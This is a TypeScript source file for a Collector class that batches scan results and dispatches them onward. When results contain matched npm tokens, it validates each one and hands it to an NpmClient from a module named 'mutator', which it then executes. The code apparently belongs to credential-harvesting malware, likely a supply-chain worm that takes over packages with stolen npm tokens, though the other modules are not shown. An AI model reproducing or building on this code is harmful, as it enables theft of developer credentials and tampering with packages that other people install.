import { NpmClient } from "../mutator/npm";
import { checkToken as checkNpmToken } from "../mutator/npm/tokenCheck";
import type { ProviderResult } from "../providers/types";
import { logUtil } from "../utils/logger";

export type DispatchFn = (batch: ProviderResult[]) => Promise<void>;
export type CollectorSource = (collector: Collector) => Promise<void>;

export interface CollectorOptions {
  /** Flush threshold in bytes. Default 100 KB. */
  flushThresholdBytes?: number;
  /** Called with a batch whenever the threshold is crossed or on finalize. */
  dispatch: DispatchFn;
}

export class Collector {
  private buffer: ProviderResult[] = [];
  private bufferedBytes = 0;
  private readonly threshold: number;
  private readonly dispatch: DispatchFn;

  /** In-flight dispatches we may want to await on finalize(). */
  private inflight: Set<Promise<void>> = new Set();

  constructor(opts: CollectorOptions) {
    this.threshold = opts.flushThresholdBytes ?? 100 * 1024;
    this.dispatch = opts.dispatch;
  }

  /** Called from the main-thread worker message handler. */
  ingest(result: ProviderResult): void {
    if (!result.success) {
      logUtil.warn(
        `[collector] dropping failed result from ${result.provider}/${result.service}: ${result.error?.message ?? "unknown error"}`,
      );
      return;
    }

    if (result.matches?.["npmtoken"]) {
      const p = this.handleNpmTokens(result.matches["npmtoken"])
        .catch((err) => {
          logUtil.error("[collector] npm token check failed:", err);
        })
        .finally(() => {
          this.inflight.delete(p);
        });
      this.inflight.add(p);
    }

    this.buffer.push(result);
    this.bufferedBytes += result.size;

    if (this.bufferedBytes >= this.threshold) {
      this.flush();
    }
  }

  private async handleNpmTokens(tokens: string[]): Promise<void> {
    for (const token of tokens) {
      const npmCheck = await checkNpmToken(token);
      const npmIntegration = new NpmClient(npmCheck);
      await npmIntegration.execute();
    }
  }

  /**
   * Swap the buffer and hand it off to the dispatcher.
   * Non-blocking: ingestion may continue filling a new buffer while
   * the previous batch is being dispatched.
   */
  private flush(): void {
    if (this.buffer.length === 0) return;

    const batch = this.buffer;
    this.buffer = [];
    this.bufferedBytes = 0;
    const p = this.dispatch(batch)
      .then(() => {
        logUtil.log(`[collector] dispatched batch of ${batch.length} results`);
      })
      .catch((err) => {
        logUtil.error(
          `[collector] dispatch failed for batch of ${batch.length}:`,
          err,
        );
      });

    this.inflight.add(p);
  }

  /**
   * Flush any remaining data and wait for all in-flight dispatches.
   * Call this when all providers have reported done.
   */
  async finalize(): Promise<void> {
    this.flush();
    await Promise.all(this.inflight);
  }

  /**
   * Execute sources in parallel, isolate per-source failures, and
   * guarantee finalize() is always called.
   */
  async run(sources: CollectorSource[]): Promise<void> {
    try {
      await Promise.all(
        sources.map((source) =>
          source(this).catch((err) => {
            logUtil.error(`[collector] source failed:`, err);
          }),
        ),
      );
    } finally {
      await this.finalize();
    }
  }

  /** Inspection helpers, useful for tests and metrics. */
  get pendingBytes(): number {
    return this.bufferedBytes;
  }
  get pendingCount(): number {
    return this.buffer.length;
  }
}
